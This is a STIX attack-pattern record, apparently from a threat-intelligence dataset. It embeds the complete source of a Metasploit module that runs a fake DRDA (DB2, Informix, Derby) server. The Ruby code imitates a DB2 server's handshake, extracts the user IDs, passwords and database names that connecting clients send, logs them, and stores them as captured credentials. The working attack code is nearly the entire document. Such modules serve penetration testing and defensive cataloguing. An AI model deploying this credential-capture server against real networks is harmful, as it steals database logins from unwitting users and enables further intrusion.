{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--cf4cc48b-a0b8-4cac-bdd9-15504f16ec8d",
    "created": "2024-08-14T16:22:00.824658Z",
    "modified": "2024-08-14T16:22:00.824662Z",
    "name": "Authentication Capture: DRDA (DB2, Informix, Derby)",
    "description": " This module provides a fake DRDA (DB2, Informix, Derby) server that is designed to capture authentication credentials. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/server/capture/drda.rb",
            "external_id": "drda.rb"
        }
    ],
    "x_code_snippet": "# -*- coding: binary -*-\n\n##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::TcpServer\n  include Msf::Auxiliary::Report\n\n  class Constants\n    CODEPOINT_ACCSEC    = 0x106d\n    CODEPOINT_SECCHK    = 0x106e\n    CODEPOINT_SRVCLSNM  = 0x1147\n    CODEPOINT_SRVCOD    = 0x1149\n    CODEPOINT_SRVRLSLV  = 0x115a\n    CODEPOINT_EXTNAM    = 0x115e\n    CODEPOINT_SRVNAM    = 0x116d\n    CODEPOINT_USERID    = 0x11a0\n    CODEPOINT_PASSWORD  = 0x11a1\n    CODEPOINT_SECMEC    = 0x11a2\n    CODEPOINT_SECCHKCD  = 0x11a4\n    CODEPOINT_SECCHKRM  = 0x1219\n    CODEPOINT_MGRLVLLS  = 0x1404\n    CODEPOINT_EXCSATRD  = 0x1443\n    CODEPOINT_ACCSECRD  = 0x14ac\n    CODEPOINT_RDBNAM    = 0x2110\n  end\n\n  def initialize\n    super(\n      'Name'           => 'Authentication Capture: DRDA (DB2, Informix, Derby)',\n      'Description'    => %q{\n        This module provides a fake DRDA (DB2, Informix, Derby) server\n      that is designed to capture authentication credentials.\n      },\n      'Author'         => 'Patrik Karlsson <patrik[at]cqure.net>',\n      'License'        => MSF_LICENSE,\n      'Actions'        => [[ 'Capture', 'Description' => 'Run DRDA capture server' ]],\n      'PassiveActions' => [ 'Capture' ],\n      'DefaultAction'  => 'Capture'\n    )\n\n    register_options(\n      [\n        OptPort.new('SRVPORT', [ true, \"The local port to listen on.\", 50000 ])\n      ])\n  end\n\n  def setup\n    super\n    @state = {}\n  end\n\n  def run\n    exploit()\n  end\n\n  def on_client_connect(c)\n    @state[c] = {\n      :name     => \"#{c.peerhost}:#{c.peerport}\",\n      :ip       => c.peerhost,\n      :port     => c.peerport,\n      :user     => nil,\n      :pass     => nil,\n      :database => nil\n    }\n  end\n\n  # translates EBDIC to ASCII\n  def drda_ascii_to_ebdic(str)\n    a2e = [\n      \"00010203372D2E2F1605250B0C0D0E0F101112133C3D322618193F271C1D1E1F\" +\n      \"405A7F7B5B6C507D4D5D5C4E6B604B61F0F1F2F3F4F5F6F7F8F97A5E4C7E6E6F\" +\n      \"7CC1C2C3C4C5C6C7C8C9D1D2D3D4D5D6D7D8D9E2E3E4E5E6E7E8E9ADE0BD5F6D\" +\n      \"79818283848586878889919293949596979899A2A3A4A5A6A7A8A9C04FD0A107\" +\n      \"202122232415061728292A2B2C090A1B30311A333435360838393A3B04143EE1\" +\n      \"4142434445464748495152535455565758596263646566676869707172737475\" +\n      \"767778808A8B8C8D8E8F909A9B9C9D9E9FA0AAABAC4AAEAFB0B1B2B3B4B5B6B7\" +\n      \"B8B9BABBBC6ABEBFCACBCCCDCECFDADBDCDDDEDFEAEBECEDEEEFFAFBFCFDFEFF\"\n    ].pack(\"H*\")\n    str.unpack('C*').map {|c| a2e[c] }.pack(\"A\"*str.length)\n  end\n\n  # translates ASCII to EBDIC\n  def drda_ebdic_to_ascii(str)\n    e2a = [\n      \"000102039C09867F978D8E0B0C0D0E0F101112139D8508871819928F1C1D1E1F\" +\n      \"80818283840A171B88898A8B8C050607909116939495960498999A9B14159E1A\" +\n      \"20A0A1A2A3A4A5A6A7A8D52E3C282B7C26A9AAABACADAEAFB0B121242A293B5E\" +\n      \"2D2FB2B3B4B5B6B7B8B9E52C255F3E3FBABBBCBDBEBFC0C1C2603A2340273D22\" +\n      \"C3616263646566676869C4C5C6C7C8C9CA6A6B6C6D6E6F707172CBCCCDCECFD0\" +\n      \"D17E737475767778797AD2D3D45BD6D7D8D9DADBDCDDDEDFE0E1E2E3E45DE6E7\" +\n      \"7B414243444546474849E8E9EAEBECED7D4A4B4C4D4E4F505152EEEFF0F1F2F3\" +\n      \"5C9F535455565758595AF4F5F6F7F8F930313233343536373839FAFBFCFDFEFF\"\n    ].pack(\"H*\")\n    str.unpack('C*').map {|c| e2a[c] }.pack(\"A\"*str.length)\n  end\n\n  # parses and returns a DRDA parameter\n  def drda_parse_parameter(data)\n    param = {\n      :length => data.slice!(0,2).unpack(\"n\")[0],\n      :codepoint => data.slice!(0,2).unpack(\"n\")[0],\n      :data => \"\"\n    }\n    param[:data] = drda_ebdic_to_ascii(data.slice!(0,param[:length] - 4).unpack(\"A*\")[0])\n    param\n  end\n\n  # creates a DRDA parameter\n  def drda_create_parameter(codepoint, data)\n    param = {\n      :codepoint => codepoint,\n      :data => drda_ascii_to_ebdic(data),\n      :length => data.length + 4\n    }\n    param\n  end\n\n  # creates a DRDA CMD with parameters and returns it as an opaque string\n  def drda_create_cmd(codepoint, options = { :format => 0x43, :correlid => 0x01 }, params=[])\n    data = \"\"\n    for p in params.each\n      data << [p[:length]].pack(\"n\")\n      data << [p[:codepoint]].pack(\"n\")\n      data << [p[:data]].pack(\"A*\")\n    end\n\n    hdr = \"\"\n    hdr << [data.length + 10].pack(\"n\")\n    hdr << [0xd0].pack(\"C\") # magic\n    hdr << [options[:format]].pack(\"C\") # format\n    hdr << [options[:correlid]].pack(\"n\") # corellid\n    hdr << [data.length + 4].pack(\"n\") # length2\n    hdr << [codepoint].pack(\"n\")\n\n    data = hdr + data\n    data\n  end\n\n  # parses a response and returns an array with commands and parameters\n  def drda_parse_response(data)\n    result = []\n\n    until data.empty?\n      cp = {\n        :length => data.slice!(0, 2).unpack(\"n\")[0],\n        :magic  => data.slice!(0, 1).unpack(\"C\")[0],\n        :format => data.slice!(0, 1).unpack(\"C\")[0],\n        :corellid => data.slice!(0,2).unpack(\"n\")[0],\n        :length2 => data.slice!(0,2).unpack(\"n\")[0],\n        :codepoint => data.slice!(0,2).unpack(\"n\")[0],\n        :params => []\n      }\n      cpdata = data.slice!(0, cp[:length] - 10)\n      until cpdata.empty?\n        cp[:params] << drda_parse_parameter(cpdata)\n      end\n      result << cp\n    end\n    result\n  end\n\n  # sends of a DRDA command\n  def drda_send_cmd(c, cmd)\n    data = \"\"\n    cmd.each {|d| data << d}\n    c.put data\n  end\n\n  def on_client_data(c)\n    data = c.get_once\n\n    return if not data\n\n    for cmd in drda_parse_response(data).each\n      case cmd[:codepoint]\n      when Constants::CODEPOINT_ACCSEC\n        params = []\n        params << drda_create_parameter(Constants::CODEPOINT_EXTNAM, \"DB2     db2sysc 05D80B00%FED%Y00\")\n        params << drda_create_parameter(Constants::CODEPOINT_MGRLVLLS, [\"9d03008e847f008e1c970000840f00979d20008d9dbe0097\"].pack(\"H*\"))\n        params << drda_create_parameter(Constants::CODEPOINT_SRVCLSNM, \"QDB2/NT64\")\n        params << drda_create_parameter(Constants::CODEPOINT_SRVNAM, \"DB2\")\n        params << drda_create_parameter(Constants::CODEPOINT_SRVRLSLV, \"SQL10010\")\n\n        cmd = []\n        cmd << drda_create_cmd(Constants::CODEPOINT_EXCSATRD, { :format => 0x43, :correlid => 1 }, params)\n\n        params = []\n        params << drda_create_parameter(Constants::CODEPOINT_SECMEC, \"\\x00\\x03\")\n        cmd << drda_create_cmd(Constants::CODEPOINT_ACCSECRD, { :format => 3, :correlid => 2 }, params)\n\n        drda_send_cmd(c, cmd)\n\n      when Constants::CODEPOINT_SECCHK\n        for p in cmd[:params].each\n          case p[:codepoint]\n          when Constants::CODEPOINT_USERID\n            @state[c][:user] = p[:data].rstrip\n          when Constants::CODEPOINT_PASSWORD\n            @state[c][:pass] = p[:data].rstrip\n          when Constants::CODEPOINT_RDBNAM\n            @state[c][:database] = p[:data].rstrip\n          end\n        end\n      else\n        # print_status(\"unhandled codepoint: #{cmd[:codepoint]}\")\n        # do nothing\n      end\n    end\n\n    if @state[c][:user] and @state[c][:pass]\n      print_good(\"DRDA LOGIN #{@state[c][:name]} Database: #{@state[c][:database]}; #{@state[c][:user]} / #{@state[c][:pass]}\")\n      report_cred(\n        ip: @state[c][:ip],\n        port: datastore['SRVPORT'],\n        service_name: 'db2_client',\n        user: @state[c][:user],\n        password: @state[c][:pass],\n        proof: @state.inspect\n      )\n\n      params = []\n      params << drda_create_parameter(Constants::CODEPOINT_SRVCOD, \"\\x00\\x97\")\n      params << drda_create_parameter(Constants::CODEPOINT_SECCHKCD, \"\\x0f\")\n\n      cmd = []\n      cmd << drda_create_cmd(Constants::CODEPOINT_SECCHKRM, { :format => 2, :correlid => 1 }, params)\n\n      drda_send_cmd(c, cmd)\n      #c.close\n    end\n  end\n\n  def report_cred(opts)\n    service_data = {\n      address: opts[:ip],\n      port: opts[:port],\n      service_name: opts[:service_name],\n      protocol: 'tcp',\n      workspace_id: myworkspace_id\n    }\n\n    credential_data = {\n      origin_type: :service,\n      module_fullname: fullname,\n      username: opts[:user],\n      private_data: opts[:password],\n      private_type: :password\n    }.merge(service_data)\n\n    login_data = {\n      core: create_credential(credential_data),\n      status: Metasploit::Model::Login::Status::UNTRIED,\n      proof: opts[:proof]\n    }.merge(service_data)\n\n    create_credential_login(login_data)\n  end\n\n  def on_client_close(c)\n    @state.delete(c)\n  end\nend\n"
}